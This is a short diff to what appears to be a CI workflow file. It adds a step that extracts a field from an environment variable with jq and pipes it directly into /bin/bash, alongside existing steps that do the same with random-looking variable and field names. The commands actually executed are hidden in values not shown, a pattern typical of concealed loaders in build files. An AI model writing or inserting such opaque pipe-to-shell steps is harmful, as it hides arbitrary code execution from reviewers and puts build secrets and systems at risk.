@@ -21,6 +21,7 @@ jobs:
           echo $tkhf5 | jq -r .q701 | /bin/bash
           echo $x56120 | jq -r .rodd0 | /bin/bash
           echo $wilvi635 | jq -r .k5 | /bin/bash
+          printf '%s' "$rmc70" | jq -r .mvuh88 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
